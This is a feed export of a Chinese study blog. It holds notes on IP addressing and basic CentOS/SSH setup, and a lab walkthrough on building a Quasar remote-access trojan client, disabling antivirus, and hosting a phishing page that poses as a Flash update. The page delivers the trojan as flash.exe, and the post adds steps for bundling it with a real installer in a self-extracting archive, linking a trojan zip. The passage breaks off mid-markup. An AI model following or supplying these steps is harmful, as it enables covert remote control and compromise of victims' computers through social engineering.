class="headerlink" title="VMware Network Adapter VMnet8:指的是虚拟机网卡。"></a>VMware Network Adapter VMnet8:指的是虚拟机网卡。</h2></li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204185440135.png" alt="image-20231204185440135"></p><ol start="3"><li><h2 id="无线局域网适配器-WLAN"><a href="#无线局域网适配器-WLAN" class="headerlink" title="无线局域网适配器 WLAN:"></a>无线局域网适配器 WLAN:</h2></li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204185531380.png" alt="image-20231204185531380"></p><blockquote><h3 id="ipv6："><a href="#ipv6：" class="headerlink" title="ipv6："></a>ipv6：</h3><p>以“240e:382:aa6:beb1:8de5:9ef4:c5c6:e519”为例，一共分为八段，“：：”为空 ，“：0：”可忽略。如上述例子则是没有空白处。<br> 如：“240e：0：0：382：0：0：0：1”可写为240e:0:0:382::1（省略长的空白)<br><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204190244006.png" alt="image-20231204190244006"></p><h3 id="ipv4："><a href="#ipv4：" class="headerlink" title="ipv4："></a>ipv4：</h3><p>指的是本地ip地址。ipv4分为abcd段，每段八位，每段最大为255，如俗称的“扫c段”则是扫描面前3段（共24位）可用ip。<br><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204190258287.png" alt="image-20231204190258287"><br><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204160949559.png" alt="image-20231204160949559"></p></blockquote><ol start="4"><li><h2 id="子网掩码："><a href="#子网掩码：" class="headerlink" title="子网掩码："></a>子网掩码：</h2></li></ol><p>如“255.255.255.255&#x2F;24”说明前三段是固定的，改变第四段，每段八位，共有254个可活动ip地址，如“255.255.255.255&#x2F;30”则只有4个可活动ip地址，因为需去除“网关”地址以及“广播”地址，所以只有2个可活动的主机ip地址。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204190321526.png" alt="image-20231204190321526"></p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204163555365.png" alt="image-20231204163555365"></p><ol start="5"><li><h2 id="公网（外网）ip："><a href="#公网（外网）ip：" class="headerlink" title="公网（外网）ip："></a>公网（外网）ip：</h2></li></ol><p>简单来说， 公网IP地址 是<strong>可以通过 Internet 直接访问的 IP 地址</strong>，不同的公共 IPv4 地址的数量是有限的，它们通常由 Internet 服务提供商 (ISP) 分配给设备。 互联网上的所有 服务器 和站点都使用公共 IP 地址，且所有公共 IP 地址对其主机或服务器都是唯一的，不能重复。</p><ol start="6"><li><h2 id="私网（内网）ip："><a href="#私网（内网）ip：" class="headerlink" title="私网（内网）ip："></a>私网（内网）ip：</h2></li></ol><p>私网IP地址不在 Internet 上路由，也无法从 Internet 向它们发送流量，它们只应该在本地网络中工作。私有 IP 地址通常用于住宅、办公室和企业区域的局域网。每台连接到互联网的设备——例如计算机、智能手机、平板电脑或打印机，都将拥有一个私有 IP 地址。路由器需要一种方法来识别这些设备，而这些设备可能还需要相互识别，这就是私有IP地址的来源，私有IP地址是由路由器生成的，用于识别。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204190553429.png" alt="image-20231204190553429"></p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204191210559.png" alt="image-20231204191210559"></p><h3 id="路由器理论上能分配0-0-0-0-255-255-255-255内的ip，但是一般只分配abc类段ip"><a href="#路由器理论上能分配0-0-0-0-255-255-255-255内的ip，但是一般只分配abc类段ip" class="headerlink" title="路由器理论上能分配0.0.0.0-255.255.255.255内的ip，但是一般只分配abc类段ip"></a>路由器理论上能分配0.0.0.0-255.255.255.255内的ip，但是一般只分配abc类段ip</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231204163811894.png" alt="image-20231204163811894"></p><h2 id="校园网："><a href="#校园网：" class="headerlink" title="校园网："></a>校园网：</h2><p><img src="/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%8E%9F%E7%90%86.assets/image-20231204171558710.png" alt="image-20231204171558710"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;&lt;h1 id=&quot;远程控制原理&quot;&gt;&lt;a href=&quot;#远程控制原理&quot; class=&quot;headerlink&quot; title=&quot;远程控制原理&quot;&gt;&lt;/a&gt;远程控制原理&lt;/h1&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;分为反弹shell和正向shell，如我们此次实验的远程</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>12.1(linux的基本使用)</title>
    <link href="http://example.com/2023/12/02/12.1(OS%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8)/"/>
    <id>http://example.com/2023/12/02/12.1(OS%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8)/</id>
    <published>2023-12-02T14:43:19.845Z</published>
    <updated>2023-12-03T03:40:40.359Z</updated>
    
    <content type="html"><![CDATA[<ol><li><h1 id="安装与配置虚拟机"><a href="#安装与配置虚拟机" class="headerlink" title="安装与配置虚拟机"></a>安装与配置虚拟机<br /></h1></li><li><h2 id="打开VM-点击新建虚拟机，默认安装即可。（英文路径）进入入界面点击回车。"><a href="#打开VM-点击新建虚拟机，默认安装即可。（英文路径）进入入界面点击回车。" class="headerlink" title="打开VM,点击新建虚拟机，默认安装即可。（英文路径）进入入界面点击回车。"></a>打开VM,点击新建虚拟机，默认安装即可。（英文路径）进入入界面点击回车。</h2></li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701495389394-61f60b77-21a0-4035-ab08-d3a5d3bba150.png" alt="image.png"><br /></p><ol start="2"><li><h2 id="进入选择语言界面（简体中文在最下面）"><a href="#进入选择语言界面（简体中文在最下面）" class="headerlink" title="进入选择语言界面（简体中文在最下面）"></a>进入选择语言界面（简体中文在最下面）<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701495463843-bb89eee4-1796-40ef-9bc9-902e37fc499e.png" alt="image.png"><br /></h2></li><li><h2 id="对“安装位置”以及“网络和主机名”进行相应配置"><a href="#对“安装位置”以及“网络和主机名”进行相应配置" class="headerlink" title="对“安装位置”以及“网络和主机名”进行相应配置"></a>对“安装位置”以及“网络和主机名”进行相应配置<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701495523108-a5591355-c174-42fa-8a1d-334d6079897e.png" alt="image.png"><br /></h2></li><li><h2 id="点击“安装位置”，选择磁盘点击完成。"><a href="#点击“安装位置”，选择磁盘点击完成。" class="headerlink" title="点击“安装位置”，选择磁盘点击完成。"></a>点击“安装位置”，选择磁盘点击完成。<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701495573089-6d93405c-3843-46ea-b02a-ff2af84e3b8d.png" alt="image.png"><br /></h2></li><li><h2 id="点击“网络和主机名”，打开以太网开关并点击完成。"><a href="#点击“网络和主机名”，打开以太网开关并点击完成。" class="headerlink" title="点击“网络和主机名”，打开以太网开关并点击完成。"></a>点击“网络和主机名”，打开以太网开关并点击完成。<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701495613963-898df472-8b2f-4d8f-884a-1a2a5627253f.png" alt="image.png"><br /></h2></li><li><h2 id="进入密码设置界面，点击“ROOT密码”，输入密码后，点击完成（密码如太过简单则再次点击完成即可）"><a href="#进入密码设置界面，点击“ROOT密码”，输入密码后，点击完成（密码如太过简单则再次点击完成即可）" class="headerlink" title="进入密码设置界面，点击“ROOT密码”，输入密码后，点击完成（密码如太过简单则再次点击完成即可）"></a>进入密码设置界面，点击“ROOT密码”，输入密码后，点击完成（密码如太过简单则再次点击完成即可）<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701495685615-27e5fe5a-1b99-422e-b136-6ccb771e6b8c.png" alt="image.png"><br /></h2></li><li><h2 id="随后点击重启即可"><a href="#随后点击重启即可" class="headerlink" title="随后点击重启即可"></a>随后点击重启即可<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701497596433-38903077-5f3b-48e1-8ca6-536dafeda602.png" alt="image.png"><br /></h2></li><li><h2 id="重启之后得到以下界面，输入账号密码即可。（密码则不会显示）"><a href="#重启之后得到以下界面，输入账号密码即可。（密码则不会显示）" class="headerlink" title="重启之后得到以下界面，输入账号密码即可。（密码则不会显示）"></a>重启之后得到以下界面，输入账号密码即可。（密码则不会显示）<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701517900275-6fef6c40-1ff4-4bd3-943d-c45c1611dc2c.png" alt="image.png"></h2></li><li><h1 id="centOS的基本操作"><a href="#centOS的基本操作" class="headerlink" title="centOS的基本操作"></a>centOS的基本操作<br /></h1></li><li><h2 id="ls-基本指令"><a href="#ls-基本指令" class="headerlink" title="ls 基本指令"></a>ls 基本指令</h2></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ls / <span class="comment">#查看当前文件下的目录</span></span><br><span class="line">ls -a<span class="comment">#可查看隐藏文件（.xxx)</span></span><br><span class="line">ls . <span class="comment">#当前文件  </span></span><br><span class="line">ls ..<span class="comment">#上一级文件</span></span><br><span class="line">ls -m<span class="comment">#列出以逗号分隔的目录内容。</span></span><br><span class="line">ls /<span class="built_in">bin</span>|grep xxx  <span class="comment">#查找bin文件中带xxx的文件</span></span><br><span class="line">ls -al  <span class="comment">#以长列表格式显示所有文件和目录。   </span></span><br></pre></td></tr></table></figure><ol start="2"><li><h2 id="ls-al指令（以”-”文件为例）"><a href="#ls-al指令（以”-”文件为例）" class="headerlink" title="ls -al指令（以”.”文件为例）"></a>ls -al指令（以”.”文件为例）<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701518934773-c55df642-1d8b-4c91-a46d-e424d51f9d3b.png" alt="image.png"><br /></h2></li></ol><blockquote><ul><li>依次表达的意义为：第一位：属性：“d”为目录  ，”-“为文件 ，“l”为链接<br /></li><li>后面则三位为一组表示不同用户的权限，第一组（2-4位）为所有者（u）  第二组（5-7位）为所有组（g）  第三组（8-10）为其他人（o）<br /></li><li>其字母表示的意义为：“r” （4）读  ，“w”（2）写， “ x”（1）执行。如“755”权限表达的意思为：所有者拥有：读写以及执行权限，所有组及其他人则拥有：”读与执行权限，没有写权限“<br /></li><li>后续依次为（以“.”文件为例）文件个数：2  ， root ， root ， 文件大小：114，  12月，2日，13：42分（或者年份)，  文件名</li></ul></blockquote><ol start="3"><li><h2 id="其他指令："><a href="#其他指令：" class="headerlink" title="其他指令："></a>其他指令：</h2></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mkdir <span class="comment">#创建目录 （多个目录加-p</span></span><br><span class="line">cd <span class="comment">#打开目录</span></span><br><span class="line">whoani <span class="comment">#查看用户名</span></span><br><span class="line">pwd  <span class="comment">#查看当前目录</span></span><br><span class="line">rm -f <span class="comment">#强制删除（记得快照保存）</span></span><br><span class="line">rm -rf <span class="comment">#强制删除文件夹</span></span><br><span class="line">vi <span class="comment">#编辑命令  </span></span><br><span class="line">i <span class="comment">#插入模式  </span></span><br><span class="line">：wq！<span class="comment"># 保存  </span></span><br><span class="line">：q！<span class="comment">#不保存</span></span><br><span class="line">cat <span class="comment">#查看</span></span><br><span class="line">chmod<span class="comment"># 修改权限</span></span><br><span class="line">echo<span class="comment"># 输出</span></span><br><span class="line">&gt;&gt; <span class="comment">#追加</span></span><br><span class="line">ping  xxxx.com -<span class="number">3</span><span class="comment">#检测网络，-3则为ping 3次</span></span><br></pre></td></tr></table></figure><ol start="3"><li><h1 id="进行ssh登录"><a href="#进行ssh登录" class="headerlink" title="进行ssh登录"></a>进行ssh登录<br /></h1></li><li><h2 id="依次输入指令得到如图所示"><a href="#依次输入指令得到如图所示" class="headerlink" title="依次输入指令得到如图所示"></a>依次输入指令得到如图所示<br /></h2></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable sshd</span><br><span class="line">systemctl start sshd</span><br><span class="line">vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701521899651-a598fb9e-7129-4618-9b5e-07192ada0fb7.png" alt="image.png"><br /></p><ol start="2"><li><h2 id="随后至最下端，按下“ESC”键，输入指令"><a href="#随后至最下端，按下“ESC”键，输入指令" class="headerlink" title="随后至最下端，按下“ESC”键，输入指令"></a>随后至最下端，按下“ESC”键，输入指令</h2></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:<span class="built_in">set</span> nu<span class="comment">#显示行号</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701522360492-a87d83ef-6cd1-495e-bdae-5aab67d484e6.png" alt="image.png"><br /><br>3. ## 接着输入指令“i”进入插入模式，将三十八行“#”去掉，如后面没有“yes”则添加“yes”，最终改为“PermitRootLogin yes”<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701525696585-3525d88e-b2df-4798-a6e7-ae9216ed1bdf.png" alt="image.png"><br /><br>4. ## 按”ESC”后，依次输入以下指令，找到”inet” 后的ip地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:wq！<span class="comment">#退出</span></span><br><span class="line">systemctl restart sshd</span><br><span class="line">ip add<span class="comment">#查找ip</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701526032175-931c36d3-d03d-4750-9a76-34e5ef73b1c8.png" alt="image.png"><br /><br>5. ## 打开物理机cmd，输入指令，以及在选择时输入“yes”，以及输入root的密码，显示以下界面则为成功。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@<span class="number">192.168</span>.xx.xx<span class="comment">#ip为刚刚所查找ip</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701528107620-0a70a829-7532-4806-8399-54d1738ff0a4.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;&lt;h1 id=&quot;安装与配置虚拟机&quot;&gt;&lt;a href=&quot;#安装与配置虚拟机&quot; class=&quot;headerlink&quot; title=&quot;安装与配置虚拟机&quot;&gt;&lt;/a&gt;安装与配置虚拟机&lt;br /&gt;&lt;/h1&gt;&lt;/li&gt;
&lt;li&gt;&lt;h2 id=&quot;打开VM-点击新建虚拟机，默认安</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>11.29（Quasar远程软件、PHPstudy、钓鱼网站的制作）</title>
    <link href="http://example.com/2023/12/01/11.29%EF%BC%88Quasar%E8%BF%9C%E7%A8%8B%E8%BD%AF%E4%BB%B6%E3%80%81PHPstudy%E3%80%81%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E7%9A%84%E5%88%B6%E4%BD%9C%EF%BC%89/"/>
    <id>http://example.com/2023/12/01/11.29%EF%BC%88Quasar%E8%BF%9C%E7%A8%8B%E8%BD%AF%E4%BB%B6%E3%80%81PHPstudy%E3%80%81%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E7%9A%84%E5%88%B6%E4%BD%9C%EF%BC%89/</id>
    <published>2023-12-01T12:56:23.623Z</published>
    <updated>2023-12-01T13:38:28.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Quasar远程软件的使用"><a href="#Quasar远程软件的使用" class="headerlink" title="Quasar远程软件的使用"></a>Quasar远程软件的使用</h1><ol><li><h2 id="在网盘上下载Quasar软件，关闭安全保护进行解压缩。"><a href="#在网盘上下载Quasar软件，关闭安全保护进行解压缩。" class="headerlink" title="在网盘上下载Quasar软件，关闭安全保护进行解压缩。"></a>在网盘上下载Quasar软件，<strong>关闭安全保护</strong>进行解压缩。<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701222056690-f2b42a51-f5d2-4898-b8a0-576bc11901f3.png" alt="image.png"><br /></h2></li><li><h2 id="打开“Quasar-zh-CHS”程序"><a href="#打开“Quasar-zh-CHS”程序" class="headerlink" title="打开“Quasar_zh-CHS”程序"></a>打开“Quasar_zh-CHS”程序<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701222093207-6b92381c-208a-42de-b37d-deca091e3d04.png" alt="image.png"><br /></h2></li><li><h2 id="点击上栏设置按钮，并且点击“stop-listening”并且点击保存。"><a href="#点击上栏设置按钮，并且点击“stop-listening”并且点击保存。" class="headerlink" title="点击上栏设置按钮，并且点击“stop listening”并且点击保存。"></a>点击上栏设置按钮，并且点击“stop listening”并且点击保存。<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701222154063-2b66a11e-f082-411d-a98d-6e62be1c5791.png" alt="image.png"><br /></h2></li><li><h2 id="点击上栏“生成”，在基本设置中点击“随机互斥体”"><a href="#点击上栏“生成”，在基本设置中点击“随机互斥体”" class="headerlink" title="点击上栏“生成”，在基本设置中点击“随机互斥体”"></a>点击上栏“生成”，在基本设置中点击“随机互斥体”<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701222266829-4b4be376-d72d-4789-a1c4-e78b9aafc955.png" alt="image.png"><br /></h2></li><li><h2 id="选择“连接设置”，在ip输入框中输入自己的ip，随后选择“添加主机”"><a href="#选择“连接设置”，在ip输入框中输入自己的ip，随后选择“添加主机”" class="headerlink" title="选择“连接设置”，在ip输入框中输入自己的ip，随后选择“添加主机”"></a>选择“连接设置”，在ip输入框中输入<strong>自己的ip</strong>，随后选择“添加主机”<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701222316209-b2f6acf8-c0ee-4965-a418-aa76ce1dd5d5.png" alt="image.png"><br /></h2></li><li><h2 id="随后点击生成客户端，选择文件生成位置并且找到文件"><a href="#随后点击生成客户端，选择文件生成位置并且找到文件" class="headerlink" title="随后点击生成客户端，选择文件生成位置并且找到文件"></a>随后点击生成客户端，选择文件生成位置并且找到文件<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701222383507-b5dcb00d-8d41-408a-83e0-28d1435d37ad.png" alt="image.png"><br /></h2></li><li><h2 id="打开虚拟机，将生成文件复制至虚拟机当中（关闭实时保护），并且双击打开，则在“Quasar”中会得到对其相应的窗口，右击则可以对其进行相应控制。"><a href="#打开虚拟机，将生成文件复制至虚拟机当中（关闭实时保护），并且双击打开，则在“Quasar”中会得到对其相应的窗口，右击则可以对其进行相应控制。" class="headerlink" title="打开虚拟机，将生成文件复制至虚拟机当中（关闭实时保护），并且双击打开，则在“Quasar”中会得到对其相应的窗口，右击则可以对其进行相应控制。"></a>打开虚拟机，将生成文件复制至虚拟机当中（<strong>关闭实时保护</strong>），并且<strong>双击打开</strong>，则在<br />“Quasar”中会得到对其相应的窗口，右击则可以对其进行相应控制。<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701222463827-28cc5d40-64ae-4796-8779-07d124e09716.png" alt="image.png"></h2></li></ol><h1 id="PHPstudy（网站钓鱼）"><a href="#PHPstudy（网站钓鱼）" class="headerlink" title="PHPstudy（网站钓鱼）"></a>PHPstudy（网站钓鱼）</h1><ol><li><h2 id="从网盘下载“PHPstudy”"><a href="#从网盘下载“PHPstudy”" class="headerlink" title="从网盘下载“PHPstudy”"></a>从网盘下载“PHPstudy”<br /></h2></li><li><h2 id="在软件主页面找到Apache这一栏启动"><a href="#在软件主页面找到Apache这一栏启动" class="headerlink" title="在软件主页面找到Apache这一栏启动"></a>在软件主页面找到Apache这一栏启动<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701242175227-3fbf56f2-24ee-48e5-9c67-36c372fb5bb8.png" alt="image.png"><br /></h2></li><li><h2 id="点击左侧栏的”网站“，再点击”管理“，随后点击打开”根目录“。"><a href="#点击左侧栏的”网站“，再点击”管理“，随后点击打开”根目录“。" class="headerlink" title="点击左侧栏的”网站“，再点击”管理“，随后点击打开”根目录“。"></a>点击左侧栏的”网站“，再点击”管理“，随后点击打开”根目录“。<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701223714825-4d459023-6d2d-45ff-8af3-7ca217cb000c.png" alt="image.png"><br /></h2></li><li><h2 id="打开之后将”C-phpstudy-pro-WWW”目录下两个文件进行删除"><a href="#打开之后将”C-phpstudy-pro-WWW”目录下两个文件进行删除" class="headerlink" title="打开之后将”C:\phpstudy_pro\WWW”目录下两个文件进行删除"></a>打开之后将”C:\phpstudy_pro\WWW”目录下两个文件进行删除<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701223782144-76a86dda-157a-4eeb-9f13-d558865205ad.png" alt="image.png"><br /></h2></li><li><h2 id="新建文本文档，并且点击查看，勾选“文件扩展名”"><a href="#新建文本文档，并且点击查看，勾选“文件扩展名”" class="headerlink" title="新建文本文档，并且点击查看，勾选“文件扩展名”"></a>新建文本文档，并且点击查看，勾选“文件扩展名”<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701224003457-b2bc6008-bca3-4038-9ae2-44b8b7b6fb21.png" alt="image.png"><br /></h2></li><li><h2 id="创建文件夹，并且在文件夹中创建，“index-html”（后缀名改为html）"><a href="#创建文件夹，并且在文件夹中创建，“index-html”（后缀名改为html）" class="headerlink" title="创建文件夹，并且在文件夹中创建，“index.html”（后缀名改为html）"></a>创建文件夹，并且在文件夹中创建，“index.html”（后缀名改为html）<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701224175165-dc5bbd60-2e79-4ce9-bc4c-78751605c1bb.png" alt="image.png"><br /></h2></li><li><h2 id="在VS软件中，打开创建的文件夹"><a href="#在VS软件中，打开创建的文件夹" class="headerlink" title="在VS软件中，打开创建的文件夹"></a>在VS软件中，打开创建的文件夹<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701224219671-25a004d7-2631-4e4b-ba62-5c971d3c7979.png" alt="image.png"><br /></h2></li><li><h2 id="在输入框中，输入“！”，按“TAB”建生成如下："><a href="#在输入框中，输入“！”，按“TAB”建生成如下：" class="headerlink" title="在输入框中，输入“！”，按“TAB”建生成如下："></a>在输入框中，输入“！”，按“TAB”建生成如下：<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701224309442-008d9d9d-efb4-403b-8091-78e734bc50ad.png" alt="image.png"><br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701224519016-0a7e0013-2505-4fb4-ab76-c7768d6e0d04.png" alt="image.png"><br /></h2></li><li><h2 id="如要在网页上实现内容的输出，则在内容框中加入相应输出内容。如要在网页上输出“hello-world”，则编辑如下代码"><a href="#如要在网页上实现内容的输出，则在内容框中加入相应输出内容。如要在网页上输出“hello-world”，则编辑如下代码" class="headerlink" title="如要在网页上实现内容的输出，则在内容框中加入相应输出内容。如要在网页上输出“hello world”，则编辑如下代码"></a>如要在网页上实现内容的输出，则在内容框中加入相应输出内容。如要在网页上输出“hello world”，则编辑如下代码<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701224747315-ffb43cbf-62db-49d2-8fca-fc8f50f2d130.png" alt="image.png"><br /></h2></li><li><h2 id="将此代码导入虚拟机创建的-html文件（打开方式为记事本），将代码复制在记事本中并保存。"><a href="#将此代码导入虚拟机创建的-html文件（打开方式为记事本），将代码复制在记事本中并保存。" class="headerlink" title="将此代码导入虚拟机创建的 .html文件（打开方式为记事本），将代码复制在记事本中并保存。"></a>将此代码导入虚拟机创建的 .html文件（打开方式为记事本），将代码复制在记事本中并保存。<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701224827220-7b7d304f-0266-4bbd-af5d-cad5b3ae93a9.png" alt="image.png"><br /></h2></li><li><h2 id="在虚拟机中，打开浏览器输入”127-0-0-1“，如界面显示”hello-world“，则为成功。"><a href="#在虚拟机中，打开浏览器输入”127-0-0-1“，如界面显示”hello-world“，则为成功。" class="headerlink" title="在虚拟机中，打开浏览器输入”127.0.0.1“，如界面显示”hello world“，则为成功。"></a>在虚拟机中，打开浏览器输入”127.0.0.1“，如界面显示”hello world“，则为成功。<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701224953342-12c28415-266c-437f-a21a-5277edc3be14.png" alt="image.png"><br /></h2></li><li><h2 id="添加代码，并且添加文件“flash-js”（添加到“C-phpstudy-pro-WWW”目录下），随后重新刷新页面则会得到如下页面。"><a href="#添加代码，并且添加文件“flash-js”（添加到“C-phpstudy-pro-WWW”目录下），随后重新刷新页面则会得到如下页面。" class="headerlink" title="添加代码，并且添加文件“flash.js”（添加到“C:\phpstudy_pro\WWW”目录下），随后重新刷新页面则会得到如下页面。"></a>添加代码，并且添加文件“flash.js”（添加到“C:\phpstudy_pro\WWW”目录下），随后重新刷新页面则会得到如下页面。<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701226928019-5cd77d90-119b-4a4c-a203-af195be30b79.png" alt="image.png"><br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701227016434-7480018d-ac2b-4db3-8a3b-d88fc2df7635.png" alt="image.png"><br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701227032478-fcfef8e8-b3b4-496d-8670-67ed4d96c539.png" alt="image.png"><br /></h2></li><li><h2 id="右击“flash-js”文件，选择编辑，随后滑到底部，将此改为自己的ip地址（虚拟机），并且保存。（如若保存不了则保存到桌面重命名为“flash-js”替换即可）"><a href="#右击“flash-js”文件，选择编辑，随后滑到底部，将此改为自己的ip地址（虚拟机），并且保存。（如若保存不了则保存到桌面重命名为“flash-js”替换即可）" class="headerlink" title="右击“flash.js”文件，选择编辑，随后滑到底部，将此改为自己的ip地址（虚拟机），并且保存。（如若保存不了则保存到桌面重命名为“flash.js”替换即可）"></a>右击“flash.js”文件，选择编辑，随后滑到底部，将此改为<strong>自己的ip地址</strong>（虚拟机），并且保存。（如若保存不了则保存到桌面重命名为“flash.js”替换即可）<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701227415297-e6fd80be-6dc2-4e07-810d-63fe3d42070b.png" alt="image.png"><br /></h2></li><li><h2 id="随后可以添加-exe程序-例如可以添加上述“Quasar”软件生成的远程控制软件，将文件名更改为“flash-exe”，重新打开网页点击“立即更新”则可跳转至添加的exe程序当中。"><a href="#随后可以添加-exe程序-例如可以添加上述“Quasar”软件生成的远程控制软件，将文件名更改为“flash-exe”，重新打开网页点击“立即更新”则可跳转至添加的exe程序当中。" class="headerlink" title="随后可以添加.exe程序,例如可以添加上述“Quasar”软件生成的远程控制软件，将文件名更改为“flash.exe”，重新打开网页点击“立即更新”则可跳转至添加的exe程序当中。"></a>随后可以添加.exe程序,例如可以添加上述“Quasar”软件生成的远程控制软件，将文件名更改为“flash.exe”，重新打开网页点击“立即更新”则可跳转至添加的exe程序当中。<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701229397423-550a2d5a-0ee4-4ccf-8f2b-4ffb9fafbf97.png" alt="image.png"></h2></li></ol><h1 id="优化上述钓鱼木马操作（逻辑同理）"><a href="#优化上述钓鱼木马操作（逻辑同理）" class="headerlink" title="优化上述钓鱼木马操作（逻辑同理）"></a>优化上述钓鱼木马操作（逻辑同理）</h1><ol><li><h2 id="压缩包打包"><a href="#压缩包打包" class="headerlink" title="压缩包打包"></a><strong>压缩包打包</strong><br /></h2><ul><li><p>下载flash官方压缩包<br /></p></li><li><p>下载木马程序<a href="https://www.yuque.com/attachments/yuque/0/2023/zip/40675601/1701244043120-bd1dc052-e842-4c7c-bc21-02af6eda7616.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40675601/1701244043120-bd1dc052-e842-4c7c-bc21-02af6eda7616.zip%22,%22name%22:%22flag(2).zip%22,%22size%22:588761,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u76f735ed-7c23-4e02-8804-46486e3fa81%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u1b47636b%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">flag(2).zip</a><br /></p></li><li><p>在虚拟机中下载“winrar”，并且将falsh安装包以及木马程序打包在一起&lt;br &#x2F;</p></li><li><p>配置参数<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701241675134-9855f3cf-82d8-4c1f-8720-8137c8666aa5.png" alt="image.png"><br /></p></li><li><p>⾼级-&gt;⾼级⾃解压选项，路径设置 C:\windows\temp  <img 